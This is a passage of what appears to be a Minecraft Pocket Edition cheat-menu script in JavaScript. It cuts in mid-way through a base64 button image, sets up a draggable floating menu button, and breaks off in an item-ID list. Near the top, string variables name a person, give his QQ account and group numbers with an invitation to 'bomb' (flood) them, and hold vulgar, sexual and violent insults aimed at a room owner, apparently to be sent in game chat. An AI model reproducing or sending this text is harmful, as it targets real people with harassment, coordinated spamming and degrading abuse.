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";
var 弱智意淫废物 = "特别挂狗：明天到底会怎样\n弱智废物外传创背，日妈平台\n他的QQ：3028140889欢迎轰炸\n还有他的弱智外传群\n群号：56562678也欢迎轰炸"
var 骂房主2喷词 = "弱智房主本野爹把你瞎妈的猪子宫砍下献给迪安让他练练拳没想到迪安刚刚打了几下就喜欢上了这特殊沙包叫你妈哆卖几个给他本野爹没办法只好把你妈的胃也做成沙包买给迪安这两个特殊沙包现在可是迪安的专属沙包呢"
var 骂房主喷词 = "§6房主你个脑残婊子卖淫嫖娼被炸了妈的狗逼游泳翱翔欲裂疯狂意淫的臭鸡巴肾宝王"

var ctx = com.mojang.minecraftpe.MainActivity.currentMainActivity.get();
ctx.runOnUiThread(new java.lang.Runnable({
    run: function() {
        var win = new android.widget.PopupWindow();
        var yicu = 0
        var xmode = 0
        var qmode = 0
        var smode = 0

        var byte = android.util.Base64.decode(base64, 0);
        var image = android.graphics.BitmapFactory.decodeByteArray(byte, 0, byte.length);
        var imageview = new android.widget.ImageView(ctx);
        imageview.setImageBitmap(image);

        imageview.setOnClickListener(new android.view.View.OnClickListener() {
            onClick: function(v) {
                openMenu()
            }
        });
        win.setContentView(imageview);
        win.setWidth(90);
        win.setHeight(90);
        win.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(127, 0, 16, 255)))
        win.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.RIGHT | android.view.Gravity.BOTTOM, 0, 500);
    }
}));

function 移动按钮(which, xx, yy, main, bool) {
    if (bool == null) {
        bool = false
    }
    var mX, mY
    which.setOnTouchListener(new android.view.View.OnTouchListener({
        onTouch: function(v, e) {
            try {
                switch (e.getAction()) {
                    case 0:
                        mX = e.getX();
                        mY = e.getY();
                        break;
                    case 1:
                        break;
                    case 2:
                        var delX = parseInt(e.getX() - mX) * 0.5;
                        var delY = parseInt(e.getY() - mY) * 0.5;
                        xx += delX;
                        yy += delY;
                        main.update(parseInt(xx), parseInt(yy), -1, -1);
                        break;
                }
                return bool;
            } catch (e) {
                print(e)
            }
        }
    }));
    return [which, main]
}
var 生成随机数字 = Math.ceil(Math.random() * 88888 + 10000)
var 物品ID一览表 = "铁锹, id: 256, 特殊值: 0\n铁镐, id: 257, 特殊值: 0\n铁斧, id: 258, 特殊值: 0\n打火石, id: 259, 特殊值: 0\n红苹果, id: 260, 特殊值: 0\n弓, id: 261, 特殊值: 0\n箭, id: 262, 特殊值: 0\n煤炭, id: 263, 特殊值: 0\n木炭, id: 263, 特殊值: 1\n钻石, id: 264, 特殊值: 0\n铁锭, id: 265, 特殊值: 0\n金锭, id: 266, 特殊值: 0\n铁剑, id: 267, 特殊值: 0\n木剑, id: 268, 特殊值: 0\n木锹, id: 269, 特殊值: 0\n木镐, id: 270, 特殊值: 0\n木斧, id: 271, 特殊值: 0\n石剑, id: 272, 特殊值: 0\n石锹, id: 273, 特殊值: 0\n石镐, id: 274, 特殊值: 0\n石斧, id: 275, 特殊值: 0\n钻石剑, id: 276, 特殊值: 0\n钻石锹, id: 277, 特殊值: 0\n钻石镐, id: 278, 特殊值: 0\n钻石斧, id: 279, 特殊值: 0\n木棍, id: 280, 特殊值: 0\n碗, id: 281, 特殊值: 0\n蘑菇汤, id: 282, 特殊值: 0\n金剑, id: 283, 特殊值: 